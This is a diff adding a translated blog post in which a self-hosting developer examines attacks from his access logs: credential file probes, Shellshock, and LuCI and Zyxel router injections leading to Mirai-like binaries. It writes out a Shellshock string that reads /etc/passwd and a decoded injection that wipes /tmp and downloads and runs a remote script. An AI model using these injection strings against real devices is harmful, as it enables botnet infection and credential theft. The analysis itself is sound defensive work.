@@ -1,0 +1,324 @@
+- en: <!--yml
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'category: 未分类'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'date: 2024-05-27 15:16:57'
+  prefs: []
+  type: TYPE_NORMAL
+- en: -->
+  prefs: []
+  type: TYPE_NORMAL
+- en: I looked through attacks in my access logs. Here's what I found
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: 来源：[https://nishtahir.com/i-looked-through-attacks-in-my-access-logs-heres-what-i-found/](https://nishtahir.com/i-looked-through-attacks-in-my-access-logs-heres-what-i-found/)
+  prefs:
+  - PREF_BQ
+  type: TYPE_NORMAL
+- en: I've been self-hosting for over a decade. It's freeing because I own my data,
+    and do not depend on any platform other than my cloud host, which I can easily
+    switch off. Self-hosting gives much insight into what it takes to run a cloud
+    service. Anyone who's had some practice doing this will likely tell you that the
+    internet is a dangerous place.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Exposing any IP onto the public internet immediately invites a flood of malicious
+    traffic. While it's undesirable there's a lot to learn from this traffic so I
+    poked through my access logs to see what sorts of attacks I've been hit with recently.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Note: I''m not a security expert. I''m just a curious developer who likes to
+    poke around so please take any assertions I make with a grain of salt. I wasn''t
+    sure what the value would be in redacting the IP addresses of bad guys but I redacted
+    them anyway erring on the side of caution. Additionally, I''ve redacted some of
+    the more colorful language used by the attackers which included poor language
+    such as slurs.'
+  prefs:
+  - PREF_BQ
+  type: TYPE_NORMAL
+- en: Credential and configuration discovery
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: The most common attacks by a wide margin are directory traversal attacks in
+    search of credentials. The most common appears to be in search of `.env` which
+    usually contains application secrets.
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE0]'
+  prefs: []
+  type: TYPE_PRE
+- en: Additionally, attackers are looking for other common files that contain credentials.
+    In my sample, they seem to be looking for AWS credentials and configuration files,
+    as well as Git repositories.
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE1]'
+  prefs: []
+  type: TYPE_PRE
+- en: Other attacks seem to be looking for common directories that may have been accidentally
+    exposed by the administrator. I have to guess that the names are guesses based
+    on common names. I'd be curious to learn more about what their success rate is.
+    Interestingly, the user agents for these attacks mention `Mozlila/5.0` which as
+    far as I can tell is a typo of `Mozilla/5.0`. A search on [GitHub](https://github.com/search?q=%22User-Agent%22%3A+%22Mozlila%2F5.0%22&type=code&ref=nishtahir.com)
+    (ignoring results attempting to block the user agent) hints that this is likely
+    a typo that was made in a common tool that has been copied and pasted around.
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE2]'
+  prefs: []
+  type: TYPE_PRE
+- en: The attackers also seem to be looking for common remote access and configuration
+    tools.
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE3]'
+  prefs: []
+  type: TYPE_PRE
+- en: The lesson here seems to be to expose the absolute bare minimum to the public
+    internet. If you don't need it, don't expose it. If you must expose tools or directories,
+    add some layer of authentication and if possible restrict access to specific IP
+    addresses because bad actors will be looking for it.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Shellshock
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: Next, we've got a bunch of attacks that seem to be exploiting the Shellshock
+    vulnerability.
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE4]'
+  prefs: []
+  type: TYPE_PRE
+- en: This vulnerability exploits Webservers that execute CGI scripts with a vulnerable
+    bash version by allowing an attacker to execute arbitrary commands. When a CGI
+    program starts, it sets environment variables with the content of the request,
+    of note is `HTTP_USER_AGENT`. When the characters `() { :; };` are included, bash
+    interprets that as a function that needs to be executed.
+  prefs: []
+  type: TYPE_NORMAL
+- en: In this specific attack, the bad guy sent this function as the user agent.
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE5]'
+  prefs: []
+  type: TYPE_PRE
+- en: Let's break it down further.
+  prefs: []
+  type: TYPE_NORMAL
+- en: '`() { ignored; };`: This part defines a function in Bash. The content inside
+    the curly braces is the function body. The ignored command is a placeholder; it
+    doesn''t affect the execution but was likely included to prevent syntax errors.'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '`echo Content-Type: text/html; echo ;`: These commands are part of the function
+    body. They set the Content-Type header of the HTTP response to "text/html" and
+    echo an empty line.'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '`/bin/cat /etc/passwd`: This is the malicious command embedded within the function.
+    It attempts to use the `cat` command to display the contents of the `/etc/passwd`
+    file, which contains user account information.'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: If the attack was successful, the attacker would theoretically gain access to
+    my user credentials as well as have a mechanism to execute arbitrary code on the
+    server.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Like the directory traversal attack, the attacker guesses common directories
+    and paths looking for an endpoint that responds favorably.
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE6]'
+  prefs: []
+  type: TYPE_PRE
+- en: LuCI Injection
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: '[PRE7]'
+  prefs: []
+  type: TYPE_PRE
+- en: This time we've got an attack that seems to be targeting the LuCI web interface
+    for OpenWRT routers. The attack attempts to inject a command into the country
+    field of a form that downloads and executes a shell script that is hosted remote
+    server. Let's break it down.
+  prefs: []
+  type: TYPE_NORMAL
+- en: The malicious code is in the URL which has been URL encoded. Decoding the URL
+    makes it easier to read.
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE8]'
+  prefs: []
+  type: TYPE_PRE
+- en: Breaking it down,
+  prefs: []
+  type: TYPE_NORMAL
+- en: '`/cgi-bin/luci/;stok=/locale`: This is the path to a CGI script in the LuCI
+    interface. LuCI is a web-based interface for OpenWRT routers and similar embedded
+    devices.'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '`?form=country&operation=write&country=`: These are parameters passed to the
+    CGI script.'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '`$(cd /tmp; rm -rf *; wget http://xxx.xxx.xxx.xxx/tenda.sh; chmod 777 tenda.sh;./tenda.sh)`:
+    This is a bash substitution command intended to be executed and the output is
+    substituted into the URL. The command is trying to cd into the `/tmp` folder,
+    delete all files, download a shell script from a remote server, and execute it.'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Please do not try what I am about to do yourself. At this point in my investigation,
+    I have no idea what the script contains or what it does. I'm taking a calculated
+    risk and have taken measures to keep myself safe. If you're not sure what you're
+    doing, attempting to do the same could cause you to end up with a compromised
+    machine.
+  prefs:
+  - PREF_BQ
+  type: TYPE_NORMAL
+- en: Downloading the script to investigate further, I discovered that the attacker
+    aimed to download and execute an additional binary.
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE9]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'The binaries appear to be named after the architecture of the target device
+    which makes sense since the attacker may not know what architecture the device
+    is running on. This would give them the most surface area to work with. (Note:
+    I censored names because the attacker renamed the binaries to common slurs)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: I proceeded to download a binary incompatible with my environment as an additional
+    precaution and installed Ghidra to investigate further. Looking through the binary
+    only had 3 functions without a lot of string data. However, there was a large
+    segment of data that looked like this.
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE10]'
+  prefs: []
+  type: TYPE_PRE
+- en: This segment stood out indicating that it's an embedded ELF binary that has
+    been packed with [UPX](https://github.com/upx/upx?ref=nishtahir.com). Some quick
+    research indicated that it's often misused by malware authors to obfuscate and
+    compress their binaries. As long as the malware author didn't modify the UPX header
+    or packed binary, we should be able to use UPX to unpack the binary.
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE11]'
+  prefs: []
+  type: TYPE_PRE
+- en: Success! We now have a lot more strings we can look at this time, which sheds
+    a bit more light on what the malware was intended to do.
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE12]'
+  prefs: []
+  type: TYPE_PRE
+- en: What stands out this time is M-SEARCH with the ST header. This is a UPnP command
+    looking for devices that support the DIAL protocol on the network. Based on the
+    accompanying XML payload it looks like the malware is programmed to scan for Huawei
+    devices on the network that are vulnerable to command injection. This appears
+    to have been identified as being part of the Mirai botnet.
+  prefs: []
+  type: TYPE_NORMAL
+- en: I tried to download the referenced `yeye.mips` however the file didn't appear
+    to be available when I attempted to fetch it. Perhaps the file is only available
+    at certain times of the day or only responds to certain headers or user agents?
+    Running `nmap` on the server revealed that there were only 2 open ports
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE13]'
+  prefs: []
+  type: TYPE_PRE
+- en: So this is where this journey came to an end.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Zyxel Injection
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: '[PRE14]'
+  prefs: []
+  type: TYPE_PRE
+- en: This time we have a shell command in the URL of a GET request. The command contains
+    a bunch of `${IFS}` shell substitutions which we can clean up to make it easier
+    to read.
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE15]'
+  prefs: []
+  type: TYPE_PRE
+- en: This appears to be exploiting `zhttpd` which a quick search points out is an
+    exploit available in Zyxel devices. Like the previous exploit, I decided to download
+    the binary and poke around in Ghidra. Fortunately this time, the binary was not
+    packed and as a result see what strings were contained to get a sense of what
+    it was intended to do.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Looking through the strings a few items stood out.
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE16]'
+  prefs: []
+  type: TYPE_PRE
+- en: Another DIAL protocol scan. Looking for vulnerable Huawei devices trying to
+    download `huhu.mips` presumably as a form of self-replication.
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE17]'
+  prefs: []
+  type: TYPE_PRE
+- en: Another standout was this command. which appear to be targetting routers according
+    to [this](https://www.akamai.com/blog/security-research/cve-2023-26801-exploited-spreading-mirai-botnet?ref=nishtahir.com)
+    post by Akamai
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'To exploit this vulnerability, an attacker can send the following HTTP POST
+    request to the "/goform/set_LimitClient_cfg" URL:'
+  prefs:
+  - PREF_BQ
+  type: TYPE_NORMAL
+- en: '...'
+  prefs:
+  - PREF_BQ
+  type: TYPE_NORMAL
+- en: Ensure that the "Cookie" header is set to "user=admin" since the program has
+    no special checks for authentication or authorization. This means that no prior
+    authentication is required to exploit the vulnerability.
+  prefs:
+  - PREF_BQ
+  type: TYPE_NORMAL
+- en: At this point, we can conclude that this is likely an agent of the Mirai botnet.
+    However, some sources also mention that it could be associated with the Linux
+    Medusa as well.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Conclusion
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: This is barely scratching the surface of my logs. There are dozens of other
+    exploits that are being attempted daily I could poke through but this post has
+    already gone long enough.
+  prefs: []
+  type: TYPE_NORMAL
+- en: This experience does highlight the importance of keeping devices, especially
+    IoT devices up to date, and if at all possible keep them off the public internet.
+    If they must be exposed, keep them isolated as much as possible to their own VLAN.
+  prefs: []
+  type: TYPE_NORMAL
